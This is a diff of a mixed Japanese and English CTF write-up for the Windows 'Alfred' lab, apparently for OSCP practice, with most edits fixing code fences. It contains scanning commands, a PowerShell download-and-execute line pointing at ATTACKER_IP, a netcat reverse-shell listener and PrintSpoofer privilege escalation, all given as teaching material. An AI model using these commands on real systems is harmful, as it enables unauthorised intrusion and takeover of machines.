@@ -33,14 +33,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 ip
-```
-
-```
 nmap -p- -sC -sV -T4 $ip
 feroxbuster -u http://$ip:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x php,html,txt -r --timeout 3 --no-state -s 200,301 -e -E
 ```
@@ -57,7 +53,7 @@ feroxbuster -u http://$ip:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Co
 
 まず全ポートを確認し、Jenkins が動作する `8080/tcp` を優先ターゲットに設定します。
 
-```
+```bash
 nmap -p- -sC -sV -T4 $ip
 feroxbuster -u http://$ip:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x php,html,txt -r --timeout 3 --no-state -s 200,301 -e -E
 ```
@@ -75,7 +71,7 @@ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:
 
 攻撃側待受:
 
-```
+```bash
 nc -lvnp 4444
 ```
 
@@ -101,7 +97,6 @@ type C:\Users\Administrator\Desktop\root.txt
 
 Alfred は「弱いWeb管理認証」から「Windows ローカル権限昇格」へ繋げる典型問題です。  
 OSCP対策としては、Web管理画面に入れた時点で OS コマンド実行経路の有無を必ず確認し、`SeImpersonatePrivilege` の有無を最優先でチェックすると効率が上がります。
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
@@ -114,7 +109,7 @@ Initial access succeeds when enumeration findings are turned into a practical ex
 
 During the privilege escalation phase, we will prioritize checking for misconfigurations such as `sudo -l` / SUID / service settings / token privilege. By starting this check immediately after acquiring a low-privileged shell, you can reduce the chance of getting stuck.
 
-```bash
+```
 whoami /priv
 PrintSpoofer64.exe -i -c cmd
 whoami
